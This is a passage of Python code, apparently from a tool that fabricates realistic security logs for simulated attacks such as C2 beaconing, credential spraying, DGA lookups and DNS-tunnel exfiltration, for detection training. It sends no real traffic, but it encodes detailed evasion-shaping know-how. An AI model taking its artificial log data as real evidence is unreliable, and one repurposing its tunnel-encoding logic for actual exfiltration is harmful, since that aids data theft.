                else float(rng.choice([3600, 7200, 14400, 86400]))
            )
            msg_types = ["REQUEST", "ACK"] if existing_lease else None
            self.activity_generator.generate_dhcp_lease(
                system=system,
                time=time,
                mac=mac,
                server_addr=dhcp_server,
                lease_time=lease_time,
                uid=generate_zeek_uid("C"),
                msg_types=msg_types,
            )
            if hasattr(self, "_dhcp_lease_state"):
                self._dhcp_lease_state[system.hostname] = {
                    "mac": mac,
                    "lease_time": lease_time,
                    "last_renewal": time.timestamp(),
                    "server_addr": dhcp_server,
                    "system": system,
                }
            malicious_event["mac_address"] = mac

        elif spec.type == "port_scan":
            malicious_event = PortScanActionBundle(
                executor=self,
                request=PortScanRequest(
                    spec=spec,
                    actor=actor,
                    system=system,
                    time=time,
                    rng=rng,
                    malicious_event=malicious_event,
                ),
            ).execute()

        elif spec.type == "beacon":
            # Resolve timing parameters
            start = self._parse_storyline_time(spec.start_time) if spec.start_time else time
            interval_sec = parse_duration(spec.interval).total_seconds()
            duration_sec = None
            count = spec.count
            if spec.duration is not None:
                duration_sec = parse_duration(spec.duration).total_seconds()
            elif spec.end_time is not None:
                end_dt = self._parse_storyline_time(spec.end_time)
                duration_sec = (end_dt - start).total_seconds()

            beacon_src_ip = spec.source_ip or system.ip

            # Deny mode: firewall context
            fw_ctx = None
            deny_conn_state = None
            if spec.action == "deny":
                from evidenceforge.events.contexts import FirewallContext

                deny_conn_state = self._get_firewall_deny_conn_state()
                src_iface = self._resolve_firewall_interface(beacon_src_ip)
                dst_iface = self._resolve_firewall_interface(spec.dst_ip)
                fw_ctx = FirewallContext(
                    action="deny",
                    msg_id=106023,
                    connection_id=0,
                    src_interface=src_iface,
                    dst_interface=dst_iface,
                    access_group=f"{src_iface}_access_in",
                )

            # Allow mode: resolve service, http context, hostname, byte sizing
            service = spec.service
            http_ctx = None
            http_is_c2 = False
            http_method = ""
            http_uri = ""
            conn_hostname = None
            emit_dns = False
            s_ob, s_rb = _size_storyline_connection(spec, rng)
            s_conn_state = spec.conn_state or "SF"

            if spec.action == "allow":
                service = service or (
                    "ssl" if spec.dst_port == 443 else "http" if spec.dst_port == 80 else "ssl"
                )
                # Build HttpContext if HTTP/proxy-visible request metadata is provided.
                # HTTPS CONNECT beacons still need this for proxy User-Agent fidelity
                # even though no origin-side Zeek http.log is emitted for TLS.
                if spec.method or spec.uri or spec.user_agent:
                    from evidenceforge.events.contexts import HttpContext

                    _method = spec.method or "GET"
                    _uri_raw = spec.uri or "/"
                    http_method = _method
                    http_uri = _uri_raw
                    _mime_type = normalize_mime_type_for_path(_uri_raw, "text/html")
                    _is_c2_http = _is_c2_http_request(
                        description=spec.description,
                        technique=spec.technique,
                        uri=_uri_raw,
                        activity=activity,
                    )
                    http_is_c2 = _is_c2_http
                    if _is_c2_http and _mime_type == "text/html":
                        _mime_type = rng.choices(
                            ["application/json", "text/plain", "application/octet-stream"],
                            weights=[65, 25, 10],
                            k=1,
                        )[0]
                    if spec.response_body_len is not None:
                        resp_bytes = spec.response_body_len
                    elif _method == "POST":
                        resp_bytes = rng.randint(200, 2000)
                    elif _is_c2_http:
                        resp_bytes = _c2_http_response_size(rng, method=_method, uri=_uri_raw)
                    else:
                        resp_bytes = response_size_for_mime(rng, _mime_type)
                    from evidenceforge.generation.activity.referrer import pick_referrer

                    _http_host2 = spec.hostname or spec.dst_ip
                    request_body_len = (
                        max(0, s_ob or 0)
                        if _method not in {"GET", "HEAD", "CONNECT", "OPTIONS"}
                        else 0
                    )
                    if request_body_len == 0 and _method == "POST":
                        request_body_len = rng.randint(100, 10000)
                    http_ctx = HttpContext(
                        method=_method,
                        host=_http_host2,
                        uri=_uri_raw,
                        version="1.1",
                        user_agent=spec.user_agent or "Mozilla/5.0",
                        request_body_len=request_body_len,
                        response_body_len=resp_bytes,
                        status_code=spec.status_code or 200,
                        status_msg={
                            200: "OK",
                            301: "Moved Permanently",
                            302: "Found",
                            403: "Forbidden",
                            404: "Not Found",
                            500: "Internal Server Error",
                        }.get(spec.status_code or 200, "OK"),
                        referrer=spec.referrer
                        if spec.referrer is not None
                        else ""
                        if _is_c2_http and rng.random() < 0.75
                        else pick_referrer(rng, _http_host2, context="general"),
                        resp_mime_types=[_mime_type] if (spec.status_code or 200) == 200 else [],
                        tags=[],
                    )

                # Hostname / DNS resolution (same logic as connection handler)
                from evidenceforge.generation.activity.network import REVERSE_DNS

                if spec.hostname:
                    conn_hostname = spec.hostname
                    emit_dns = True
                elif spec.dst_ip in REVERSE_DNS:
                    conn_hostname = None
                    emit_dns = True
                else:
                    conn_hostname = ""
                    emit_dns = False

            # Resolve source system
            src_sys = None
            ip_map = getattr(self.activity_generator, "_ip_to_system", {})
            if beacon_src_ip in ip_map:
                src_sys = ip_map[beacon_src_ip]
            elif beacon_src_ip == system.ip:
                src_sys = system
            story_pid, story_image = self._last_storyline_process_for_system(src_sys)

            attempt_count = 0
            for tick_time in _iter_periodic_ticks(
                start, interval_sec, duration_sec, count, spec.jitter, rng
            ):
                self.state_manager.set_current_time(tick_time)
                tick_http_ctx = http_ctx
                tick_resp_bytes = s_rb
                if http_ctx is not None and http_is_c2 and spec.response_body_len is None:
                    tick_http_body_len = _c2_http_response_size(
                        rng,
                        method=http_method or http_ctx.method,
                        uri=http_uri or http_ctx.uri,
                    )
                    tick_http_ctx = replace(
                        http_ctx,
                        response_body_len=tick_http_body_len,
                        tags=list(http_ctx.tags),
                        resp_fuids=list(http_ctx.resp_fuids),
                        resp_mime_types=list(http_ctx.resp_mime_types),
                    )
                    tick_resp_bytes = max(s_rb, tick_http_body_len + rng.randint(300, 5000))
                if story_pid <= 0:
                    story_pid, story_image = self._ensure_storyline_service_process_for_beacon(
                        actor,
                        src_sys,
                        tick_time,
                    )
                if spec.action == "deny":
                    proxy_chain = getattr(self.activity_generator, "_proxy_routes", {}).get(
                        beacon_src_ip
                    )
                    explicit_proxy = (
                        getattr(self.activity_generator, "_proxy_mode", "transparent") == "explicit"
                        and proxy_chain
                        and spec.protocol == "tcp"
                        and spec.dst_port in (80, 443)
                    )
                    if explicit_proxy:
                        from evidenceforge.events.contexts import ProxyContext

                        proxy_sys = proxy_chain[0]
                        beacon_host = spec.hostname or spec.dst_ip
                        proxy_method = "CONNECT" if spec.dst_port == 443 else (spec.method or "GET")
                        proxy_url = (
                            f"{beacon_host}:443"
                            if proxy_method == "CONNECT"
                            else f"http://{beacon_host}{spec.uri or '/'}"
                        )
                        proxy_user_agent = spec.user_agent or "Mozilla/5.0"
                        proxy_source_system = getattr(
                            self.activity_generator,
                            "_ip_to_system",
                            {},
                        ).get(beacon_src_ip)
                        proxy_ctx = ProxyContext(
                            client_ip=beacon_src_ip,
                            username=self.activity_generator._proxy_username_for_source(
                                source_system=proxy_source_system,
                                user_agent=proxy_user_agent,
                                cache_result="DENIED",
                            ),
                            method=proxy_method,
                            url=proxy_url,
                            host=beacon_host,
                            status_code=403,
                            sc_bytes=rng.randint(500, 2000),
                            cs_bytes=rng.randint(180, 520),
                            time_taken=rng.randint(20, 1500),
                            user_agent=proxy_user_agent,
                            content_type="text/html",
                            cache_result="DENIED",
                            referrer=spec.referrer or "",
                            proxy_fqdn=self.activity_generator._proxy_fqdn(proxy_sys),
                            proxy_action="deny",
                        )
                        self.activity_generator.generate_connection(
                            src_ip=beacon_src_ip,
                            dst_ip=spec.dst_ip,
                            time=tick_time,
                            dst_port=spec.dst_port,
                            proto=spec.protocol,
                            service="ssl" if spec.dst_port == 443 else "http",
                            duration=rng.uniform(0.05, 2.0),
                            orig_bytes=s_ob,
                            resp_bytes=tick_resp_bytes,
                            conn_state="SF",
                            emit_dns=emit_dns and attempt_count == 0,
                            source_system=src_sys,
                            http=tick_http_ctx,
                            proxy=proxy_ctx,
                            hostname=conn_hostname if conn_hostname is not None else spec.hostname,
                            pid=story_pid,
                            process_image=story_image,
                            preserve_dst_ip=bool(spec.hostname),
                        )
                    else:
                        self.activity_generator.generate_connection(
                            src_ip=beacon_src_ip,
                            dst_ip=spec.dst_ip,
                            time=tick_time,
                            dst_port=spec.dst_port,
                            proto=spec.protocol,
                            conn_state=deny_conn_state,
                            firewall=fw_ctx,
                            emit_dns=False,
                        )
                else:
                    # Allow DNS only on the first tick; cache handles the rest
                    self.activity_generator.generate_connection(
                        src_ip=beacon_src_ip,
                        dst_ip=spec.dst_ip,
                        time=tick_time,
                        dst_port=spec.dst_port,
                        proto=spec.protocol,
                        service=service,
                        duration=rng.uniform(0.5, 10.0),
                        orig_bytes=s_ob,
                        resp_bytes=tick_resp_bytes,
                        conn_state=s_conn_state,
                        emit_dns=emit_dns and attempt_count == 0,
                        source_system=src_sys,
                        http=tick_http_ctx,
                        hostname=conn_hostname,
                        pid=story_pid,
                        process_image=story_image,
                        preserve_dst_ip=bool(spec.hostname),
                    )
                attempt_count += 1

            malicious_event["dst_ip"] = spec.dst_ip
            malicious_event["dst_port"] = spec.dst_port
            malicious_event["interval"] = spec.interval
            malicious_event["action"] = spec.action
            term = spec.duration or spec.end_time or f"count={spec.count}"
            malicious_event["termination"] = term
            malicious_event["attempt_count"] = attempt_count

        elif spec.type == "dns_query":
            # QTYPE name → numeric mapping
            _QTYPE_MAP = {
                "A": 1,
                "AAAA": 28,
                "TXT": 16,
                "CNAME": 5,
                "MX": 15,
                "NULL": 10,
                "SRV": 33,
                "PTR": 12,
            }
            _RCODE_MAP = {"NOERROR": 0, "NXDOMAIN": 3, "SERVFAIL": 2, "REFUSED": 5}

            from evidenceforge.events.contexts import DnsContext

            qtype_num = _QTYPE_MAP.get(spec.qtype, 1)
            rcode_num = _RCODE_MAP.get(spec.rcode, 0)

            # Build answers list
            answers = []
            ttls = []
            if spec.answer is not None:
                answers = [spec.answer] if isinstance(spec.answer, str) else list(spec.answer)
                ttl_val = float(spec.ttl) if spec.ttl is not None else float(rng.randint(60, 3600))
                ttls = [ttl_val] * len(answers)

            # Resolve DNS server IP before choosing source-native DNS RTT so
            # local resolvers do not get impossible multi-second timings.
            dns_server_ips = getattr(self.activity_generator, "_dns_server_ips", ["10.0.0.1"])
            dns_server_ip = rng.choice(dns_server_ips)
            query_src_ip = spec.source_ip or system.ip
            from evidenceforge.generation.activity.generator import _dns_rtt

            dns_ctx = DnsContext(
                query=spec.query,
                query_type=spec.qtype,
                qtype=qtype_num,
                rcode=spec.rcode,
                rcode_num=rcode_num,
                answers=answers,
                TTLs=ttls,
                preserve_ttls=spec.ttl is not None,
                trans_id=rng.randint(1, 65535),
                AA=False,
                RD=True,
                RA=True,
                rejected=spec.rcode == "REFUSED",
                rtt=_dns_rtt(rng, dns_server_ip),
            )

            self.activity_generator.generate_connection(
                src_ip=query_src_ip,
                dst_ip=dns_server_ip,
                time=time,
                dst_port=53,
                proto="udp",
                service="dns",
                dns=dns_ctx,
                emit_dns=False,
                orig_bytes=rng.randint(40, 100),
                resp_bytes=rng.randint(80, 400) if spec.rcode == "NOERROR" else rng.randint(40, 80),
                conn_state="SF",
                duration=rng.uniform(0.001, 0.05),
            )

            malicious_event["query"] = spec.query
            malicious_event["qtype"] = spec.qtype
            malicious_event["rcode"] = spec.rcode

        elif spec.type == "web_scan":
            malicious_event = WebScanActionBundle(
                executor=self,
                request=WebScanRequest(
                    spec=spec,
                    actor=actor,
                    system=system,
                    time=time,
                    rng=rng,
                    malicious_event=malicious_event,
                ),
            ).execute()

        elif spec.type == "credential_spray":
            # Timing
            start = self._parse_storyline_time(spec.start_time) if spec.start_time else time
            interval_sec = parse_duration(spec.interval).total_seconds()
            duration_sec = None
            count = spec.count
            if spec.duration is not None:
                duration_sec = parse_duration(spec.duration).total_seconds()
            elif spec.end_time is not None:
                end_dt = self._parse_storyline_time(spec.end_time)
                duration_sec = (end_dt - start).total_seconds()

            spray_src_ip = spec.source_ip or system.ip
            accounts = spec.target_accounts
            success_spec = spec.success
            success_account = success_spec.get("account") if success_spec else None
            success_after = success_spec.get("after", 0) if success_spec else 0

            # Resolve target accounts — include service accounts as synthetic User
            # objects so credential_spray targets resolve for both failed and success logons
            from evidenceforge.models.scenario import User as _User

            scenario_users = {u.username: u for u in self.scenario.environment.users}
            ad_domain = self.scenario.environment.domain or "corp.local"
            for svc_name in self.scenario.environment.service_accounts:
                if svc_name not in scenario_users:
                    scenario_users[svc_name] = _User(
                        username=svc_name,
                        full_name=svc_name,
                        email=f"{svc_name}@{ad_domain}",
                    )

            # Only attach DC for Windows domain-account sprays — Linux SSH brute
            # force or local-account attacks should not produce DC-side 4625/4776
            dc_system = None
            is_windows_target = "windows" in system.os.lower()
            has_domain_account = any(acct in scenario_users for acct in accounts)
            if is_windows_target and has_domain_account:
                dcs = [
                    s for s in self.scenario.environment.systems if s.type == "domain_controller"
                ]
                if dcs:
                    # Deterministic DC per source IP (mimics AD DC Locator caching)
                    dc_idx = _stable_seed(f"preferred_dc_{spray_src_ip}") % len(dcs)
                    dc_system = dcs[dc_idx]

            attempt_count = 0
            for tick_time in _iter_periodic_ticks(
                start, interval_sec, duration_sec, count, spec.jitter, rng
            ):
                self.state_manager.set_current_time(tick_time)

                # Success fires at exactly the requested attempt count,
                # regardless of which account the pattern would have selected
                if success_account and attempt_count == success_after:
                    target_user = scenario_users.get(success_account, actor)
                    self.activity_generator.generate_logon(
                        user=target_user,
                        system=system,
                        time=tick_time,
                        logon_type=spec.logon_type,
                        source_ip=spray_src_ip,
                    )
                    attempt_count += 1
                    malicious_event["success_account"] = success_account
                    malicious_event["success_at_attempt"] = attempt_count
                    break

                # Select target account based on pattern
                if spec.pattern == "spray":
                    target_account = accounts[attempt_count % len(accounts)]
                elif spec.pattern == "brute_force":
                    target_account = accounts[
                        min(
                            attempt_count // max(1, (spec.count or 100) // len(accounts)),
                            len(accounts) - 1,
                        )
                    ]
                else:  # stuffing
                    target_account = accounts[attempt_count % len(accounts)]

                target_user = scenario_users.get(target_account, actor)

                self.activity_generator.generate_failed_logon(
                    user=target_user,
                    system=system,
                    time=tick_time,
                    logon_type=spec.logon_type,
                    source_ip=spray_src_ip,
                    target_username=target_account,
                    dc_system=dc_system,
                )
                attempt_count += 1

            malicious_event["pattern"] = spec.pattern
            malicious_event["target_accounts"] = accounts
            malicious_event["attempt_count"] = attempt_count

        elif spec.type == "dga_queries":
            import random as _random

            from evidenceforge.events.contexts import DnsContext

            # Timing
            start = self._parse_storyline_time(spec.start_time) if spec.start_time else time
            interval_sec = parse_duration(spec.interval).total_seconds()
            duration_sec = None
            count = spec.count
            if spec.duration is not None:
                duration_sec = parse_duration(spec.duration).total_seconds()
            elif spec.end_time is not None:
                end_dt = self._parse_storyline_time(spec.end_time)
                duration_sec = (end_dt - start).total_seconds()

            # DGA RNG — separate from main rng for reproducibility
            dga_seed = spec.seed if spec.seed is not None else rng.randint(0, 2**31)
            dga_rng = _random.Random(dga_seed)

            # Rcode distribution
            rcode_dist = spec.rcode_distribution or {"NXDOMAIN": 0.95, "NOERROR": 0.05}
            rcode_names = list(rcode_dist.keys())
            rcode_weights = list(rcode_dist.values())

            _RCODE_MAP = {"NOERROR": 0, "NXDOMAIN": 3, "SERVFAIL": 2, "REFUSED": 5}
            _QTYPE_MAP = {"A": 1, "AAAA": 28, "TXT": 16, "CNAME": 5}

            query_src_ip = spec.source_ip or system.ip
            dns_server_ips = getattr(self.activity_generator, "_dns_server_ips", ["10.0.0.1"])

            query_count = 0
            nxdomain_count = 0
            domain_sample = []
            for tick_time in _iter_periodic_ticks(
                start, interval_sec, duration_sec, count, spec.jitter, rng
            ):
                self.state_manager.set_current_time(tick_time)

                # Generate random domain
                label_len = dga_rng.randint(*spec.length_range)
                label = "".join(dga_rng.choices(spec.charset, k=label_len))
                domain = f"{label}{spec.tld}"

                # Select rcode
                rcode_name = dga_rng.choices(rcode_names, weights=rcode_weights, k=1)[0]
                rcode_num = _RCODE_MAP.get(rcode_name, 3)

                answers = []
                ttls = []
                if rcode_name == "NOERROR" and spec.answer_ip:
                    answers = [spec.answer_ip]
                    ttls = [float(dga_rng.randint(60, 3600))]
                if rcode_name == "NXDOMAIN":
                    nxdomain_count += 1

                dns_server_ip = rng.choice(dns_server_ips)
                from evidenceforge.generation.activity.generator import _dns_rtt

                dns_ctx = DnsContext(
                    query=domain,
                    query_type="A",
                    qtype=1,
                    rcode=rcode_name,
                    rcode_num=rcode_num,
                    answers=answers,
                    TTLs=ttls,
                    trans_id=rng.randint(1, 65535),
                    AA=False,
                    RD=True,
                    RA=True,
                    rejected=False,
                    rtt=_dns_rtt(rng, dns_server_ip),
                )

                self.activity_generator.generate_connection(
                    src_ip=query_src_ip,
                    dst_ip=dns_server_ip,
                    time=tick_time,
                    dst_port=53,
                    proto="udp",
                    service="dns",
                    dns=dns_ctx,
                    emit_dns=False,
                    orig_bytes=rng.randint(40, 100),
                    resp_bytes=rng.randint(80, 400)
                    if rcode_name == "NOERROR"
                    else rng.randint(40, 80),
                    conn_state="SF",
                    duration=rng.uniform(0.001, 0.05),
                )
                query_count += 1
                if len(domain_sample) < 5:
                    domain_sample.append(domain)

            malicious_event["total_queries"] = query_count
            malicious_event["nxdomain_count"] = nxdomain_count
            malicious_event["domain_sample"] = domain_sample
            malicious_event["tld"] = spec.tld

        elif spec.type == "dns_tunnel":
            import base64 as _b64

            from evidenceforge.events.contexts import DnsContext
            from evidenceforge.generation.activity.network_params import (
                dns_tunnel_rcode_weights,
                dns_tunnel_response_templates,
                dns_tunnel_rtt_range,
                dns_tunnel_ttl_choices,
            )

            _QTYPE_MAP = {"TXT": 16, "NULL": 10, "CNAME": 5}
            _RCODE_MAP = {"NOERROR": 0, "NXDOMAIN": 3, "SERVFAIL": 2, "REFUSED": 5}

            # Timing
            start = self._parse_storyline_time(spec.start_time) if spec.start_time else time
            interval_sec = parse_duration(spec.interval).total_seconds()
            duration_sec = None
            count = spec.count
            if spec.duration is not None:
                duration_sec = parse_duration(spec.duration).total_seconds()
            elif spec.end_time is not None:
                end_dt = self._parse_storyline_time(spec.end_time)
                duration_sec = (end_dt - start).total_seconds()

            query_src_ip = spec.source_ip or system.ip
            dns_server_ips = getattr(self.activity_generator, "_dns_server_ips", ["10.0.0.1"])

            # Generate or use payload
            if spec.payload:
                payload_bytes = spec.payload.encode("utf-8")
            else:
                payload_bytes = rng.randbytes(spec.payload_size)

            # Calculate raw bytes that can fit in the visible label for each encoding.
            if spec.encoding == "hex":
                bytes_per_label = spec.label_length // 2
            elif spec.encoding == "base32":
                bytes_per_label = (spec.label_length * 5) // 8
            else:  # base64
                bytes_per_label = (spec.label_length * 3) // 4
            bytes_per_label = max(1, bytes_per_label)

            # Reserve visible label capacity for tunnel metadata before chunking the payload.
            # Otherwise full-sized chunks would be encoded with metadata and truncated, causing
            # GROUND_TRUTH.md to count bytes that never appeared in the emitted DNS label.
            visible_nonce_len = 2
            sequence_len = 4
            payload_bytes_per_label = max(0, bytes_per_label - visible_nonce_len - sequence_len)

            # Chunk only the bytes that can actually be emitted in the label. Very small labels
            # still generate DNS traffic but carry no visible payload, so ground truth reports 0.
            chunks: list[bytes]
            if payload_bytes_per_label > 0:
                chunks = [
                    payload_bytes[i : i + payload_bytes_per_label]
                    for i in range(0, len(payload_bytes), payload_bytes_per_label)
                ]
            else:
                chunks = [b""]

            qtype_num = _QTYPE_MAP.get(spec.qtype, 16)
            min_rtt, max_rtt = dns_tunnel_rtt_range()
            response_templates = dns_tunnel_response_templates() or ["status={token}"]
            response_primary_template = rng.choice(response_templates)
            response_secondary_templates = [
                template
                for template in rng.sample(
                    response_templates,
                    k=min(len(response_templates), rng.randint(3, 6)),
                )
                if template != response_primary_template
            ]
            ttl_choices = dns_tunnel_ttl_choices()
            campaign_ttl = _choose_dns_tunnel_campaign_ttl(ttl_choices, rng)
            rcode_weights = dns_tunnel_rcode_weights()
            rcode_names = list(rcode_weights)
            rcode_values = [rcode_weights[name] for name in rcode_names]
            total_bytes = 0
            query_count = 0
            chunk_idx = 0
            tunnel_salt = rng.randbytes(4)

            scenario = getattr(self, "scenario", None)
            environment = getattr(scenario, "environment", None)
            background_systems = [
                candidate
                for candidate in getattr(environment, "systems", [])
                if getattr(candidate, "ip", "") and getattr(candidate, "ip", "") != query_src_ip
            ]
            background_window_sec = (
                duration_sec
                if duration_sec is not None
                else interval_sec * float(count if count is not None else 120)
            )
            if background_systems and background_window_sec > 0:
                background_count = min(36, max(12, len(background_systems) * 2 + rng.randint(3, 9)))
                for _ in range(background_count):
                    bg_system = rng.choice(background_systems)
                    bg_query, bg_answer, bg_ttl = _dns_tunnel_background_txt_record(rng)
                    bg_rtt = rng.uniform(min_rtt, max_rtt)
                    bg_dns = DnsContext(
                        query=bg_query,
                        query_type="TXT",
                        qtype=16,
                        rcode="NOERROR",
                        rcode_num=0,
                        answers=[bg_answer],
                        TTLs=[float(bg_ttl)],
                        trans_id=rng.randint(1, 65535),
                        AA=False,
                        RD=True,
                        RA=True,
                        rejected=False,
                        rtt=bg_rtt,
                    )
                    bg_offset = rng.uniform(-240.0, background_window_sec + 240.0)
                    bg_time = start + timedelta(seconds=bg_offset)
                    self.activity_generator.generate_connection(
                        src_ip=bg_system.ip,
                        dst_ip=rng.choice(dns_server_ips),
                        time=bg_time,
                        dst_port=53,
                        proto="udp",
                        service="dns",
                        dns=bg_dns,
                        emit_dns=False,
                        resp_bytes=max(90, len(bg_query) + len(bg_answer) + rng.randint(35, 120)),
                        duration=bg_rtt,
                        source_system=bg_system,
                    )

            for tick_time in _iter_dns_tunnel_ticks(
                start, interval_sec, duration_sec, count, spec.jitter, rng
            ):
                self.state_manager.set_current_time(tick_time)

                if spec.label_length >= 24:
                    min_label_length = max(14, int(spec.label_length * 0.45))
                    label_length = int(
                        rng.triangular(min_label_length, spec.label_length, spec.label_length - 4)
                    )
                elif spec.label_length >= 20:
                    label_length = rng.randint(max(16, spec.label_length - 8), spec.label_length)
                else:
                    label_length = spec.label_length
                if spec.encoding == "hex":
                    effective_bytes_per_label = label_length // 2
                elif spec.encoding == "base32":
                    effective_bytes_per_label = (label_length * 5) // 8
                else:  # base64
                    effective_bytes_per_label = (label_length * 3) // 4
                effective_bytes_per_label = max(1, effective_bytes_per_label)

                chunk = chunks[chunk_idx % len(chunks)]
                chunk_idx += 1
                sequence_mask = random.Random(
                    _stable_seed(
                        f"dns_tunnel_seq:{spec.base_domain}:{tunnel_salt.hex()}:{query_count}"
                    )
                ).getrandbits(32)
                sequence = (query_count ^ sequence_mask).to_bytes(4, "big", signed=False)
                visible_nonce = rng.randbytes(visible_nonce_len)
                effective_payload_capacity = max(
                    0,
                    effective_bytes_per_label - visible_nonce_len - sequence_len,
                )
                visible_payload = chunk[: min(payload_bytes_per_label, effective_payload_capacity)]
                pad_len = max(
                    0,
                    effective_bytes_per_label
                    - len(visible_nonce)
                    - len(visible_payload)
                    - len(sequence),
                )
                padded_chunk = visible_nonce + visible_payload + rng.randbytes(pad_len) + sequence

                # Encode chunk
                if spec.encoding == "hex":
                    encoded = padded_chunk.hex()
                elif spec.encoding == "base32":
                    encoded = _b64.b32encode(padded_chunk).decode("ascii").rstrip("=").lower()
                else:  # base64
                    encoded = (
                        _b64.urlsafe_b64encode(padded_chunk).decode("ascii").rstrip("=").lower()
                    )

                # Truncate to label_length
                encoded = encoded[:label_length]
                query_labels = [
                    encoded,
                    *_dns_tunnel_extra_labels(
                        query_count,
                        random.Random(
                            _stable_seed(
                                "dns_tunnel_extra_labels:"
                                f"{spec.base_domain}:{tunnel_salt.hex()}:{query_count}"
                            )
                        ),
                    ),
                ]
                tunnel_query = ".".join([*query_labels, spec.base_domain])

                rcode_name = rng.choices(rcode_names, weights=rcode_values, k=1)[0]
                rcode_num = _RCODE_MAP.get(rcode_name, 0)
                answers: list[str] = []
                ttls: list[float] = []
                if rcode_name == "NOERROR":
                    # TXT responses carry data back; CNAME/NULL are smaller.
                    if spec.qtype == "TXT":
                        resp_bytes = rng.randint(140, 2400)
                    else:
                        resp_bytes = rng.randint(50, 240)
                    token_rng = random.Random(
                        _stable_seed(
                            f"dns_tunnel_response:{spec.base_domain}:{query_count}:"
                            f"{tunnel_salt.hex()}"
                        )
                    )
                    token_bytes = token_rng.randbytes(token_rng.randint(3, 10))
                    token_style = token_rng.choice(["hex", "base32", "base64url"])
                    if token_style == "base32":
                        response_token = _b64.b32encode(token_bytes).decode("ascii").rstrip("=")
                    elif token_style == "base64url":
                        response_token = (
                            _b64.urlsafe_b64encode(token_bytes).decode("ascii").rstrip("=")
                        )
                    else:
                        response_token = token_bytes.hex()
                    response_ttl = _choose_dns_tunnel_response_ttl(
                        ttl_choices,
                        campaign_ttl,
                        rng,
                    )
                    response_template = _choose_dns_tunnel_response_template(
                        response_templates,
                        response_primary_template,
                        response_secondary_templates,
                        rng,
                    )
                    answers = [
                        _render_dns_tunnel_response_template(
                            response_template,
                            token=response_token,
                            query_count=query_count,
                            ttl=response_ttl,
                            rng=rng,
                        )
                    ]
                    ttls = [response_ttl]
                else:
                    resp_bytes = rng.randint(55, 180)

                dns_ctx = DnsContext(
                    query=tunnel_query,
                    query_type=spec.qtype,
                    qtype=qtype_num,
                    rcode=rcode_name,
                    rcode_num=rcode_num,
                    answers=answers,
                    TTLs=ttls,
                    trans_id=rng.randint(1, 65535),
                    AA=False,
                    RD=True,
                    RA=True,
                    rejected=False,
                    rtt=rng.uniform(min_rtt, max_rtt),
                )

                dns_server_ip = rng.choice(dns_server_ips)
                self.activity_generator.generate_connection(
                    src_ip=query_src_ip,
                    dst_ip=dns_server_ip,
                    time=tick_time,
                    dst_port=53,
                    proto="udp",
                    service="dns",
                    dns=dns_ctx,
                    emit_dns=False,
                    resp_bytes=resp_bytes,
                    duration=dns_ctx.rtt,
                )
                total_bytes += len(visible_payload)
                query_count += 1

            malicious_event["base_domain"] = spec.base_domain
            malicious_event["encoding"] = spec.encoding
            malicious_event["qtype"] = spec.qtype
            malicious_event["total_queries"] = query_count
            malicious_event["bytes_exfiltrated"] = total_bytes

        elif spec.type == "explicit_credentials":
            story_pid, _story_image = self._last_storyline_process_for_system(system)
            self.activity_generator.generate_explicit_credentials(
                user=actor,
                system=system,
                time=time,
                target_username=spec.target_username,
                target_server=spec.target_server or system.hostname,
                process_name=spec.process_name or r"C:\Windows\System32\runas.exe",
                process_pid=story_pid if story_pid > 0 else 0,
                source_ip=spec.source_ip or "",
            )
            malicious_event["target_username"] = spec.target_username
            malicious_event["target_server"] = spec.target_server

        elif spec.type == "workstation_lock":
            sessions = self.state_manager.get_sessions_for_user(actor.username)
            session = max(
                (
                    s
                    for s in sessions
                    if s.system == system.hostname
                    and s.logon_type in (2, 11)
                    and s.session_kind not in {"network", "service", "rdp", "ssh"}
                    and s.start_time <= time
                ),
                key=lambda s: s.start_time,
                default=None,
            )
            logon_id = session.logon_id if session else "0x0"
            self.activity_generator.generate_workstation_lock(
                user=actor,
                system=system,
                time=time,
                logon_id=logon_id,
            )

        elif spec.type == "workstation_unlock":
            sessions = self.state_manager.get_sessions_for_user(actor.username)
            session = max(
                (
                    s
                    for s in sessions
                    if s.system == system.hostname
                    and s.logon_type in (2, 11)
                    and s.session_kind not in {"network", "service", "rdp", "ssh"}
                    and s.start_time <= time
                ),
                key=lambda s: s.start_time,
                default=None,
            )
            logon_id = session.logon_id if session else "0x0"
            self.activity_generator.generate_workstation_unlock(
                user=actor,
                system=system,
                time=time,
                logon_id=logon_id,
            )

        elif spec.type == "raw":
            self.activity_generator.generate_raw(
                time=time,
                target_format=spec.target_format,
                fields=spec.fields,
                system=system,
            )
            malicious_event["target_format"] = spec.target_format

        return malicious_event

    def _execute_port_scan_bundle(self, request: PortScanRequest) -> dict[str, Any]:
        """Expand a port-scan action bundle through the existing storyline adapter."""

        import ipaddress

        spec = request.spec
        system = request.system
        time = request.time
        rng = request.rng
        malicious_event = request.malicious_event

        # Use source_ip override if specified, otherwise use system IP.
        scan_src_ip = spec.source_ip or system.ip
        is_external_scan = (
            not _is_private_ip(scan_src_ip)
            and hasattr(self, "dispatcher")
            and self.dispatcher.visibility_engine
        )

        # Resolve target IPs.
        if spec.target_ips:
            resolved_targets = []
            for target_ip in spec.target_ips:
                if is_external_scan:
                    public_target = self.dispatcher.visibility_engine.get_public_inbound_address(
                        target_ip
                    )
                    if public_target is None:
                        continue
                    resolved_targets.append(public_target)
                else:
                    resolved_targets.append(target_ip)
        elif spec.target_segment and self.scenario.environment.network:
            seg = next(
                (
                    s
                    for s in self.scenario.environment.network.segments
                    if s.name == spec.target_segment
                ),
                None,
            )
            if seg:
                if is_external_scan:
                    segment_hostnames = set(seg.systems or [])
                    if segment_hostnames:
                        segment_systems = [
                            candidate
                            for candidate in self.scenario.environment.systems
                            if candidate.hostname in segment_hostnames
                        ]
                    else:
                        net = ipaddress.ip_network(seg.cidr, strict=False)
                        segment_systems = [
                            candidate
                            for candidate in self.scenario.environment.systems
                            if ipaddress.ip_address(candidate.ip) in net
                        ]
                    all_hosts = []
                    for candidate in segment_systems:
                        public_target = (
                            self.dispatcher.visibility_engine.get_public_inbound_address(
                                candidate.ip
                            )
                        )
                        if public_target:
                            all_hosts.append(public_target)
                else:
                    net = ipaddress.ip_network(seg.cidr, strict=False)
                    all_hosts = [str(h) for h in net.hosts()]
                count = min(spec.target_count, len(all_hosts))
                resolved_targets = rng.sample(all_hosts, count)
            else:
                resolved_targets = []
        else:
            resolved_targets = []

        conn_state = self._get_firewall_deny_conn_state()
        src_iface = self._resolve_firewall_interface(scan_src_ip)
        ip_map = getattr(self.activity_generator, "_ip_to_system", {})
        vip_to_real_ip = getattr(
            getattr(getattr(self, "dispatcher", None), "visibility_engine", None),
            "_vip_to_real_ip",
            {},
        )
        segment_cidrs = {}
        fw_sensor = None
        if self.scenario.environment.network:
            for segment in self.scenario.environment.network.segments:
                try:
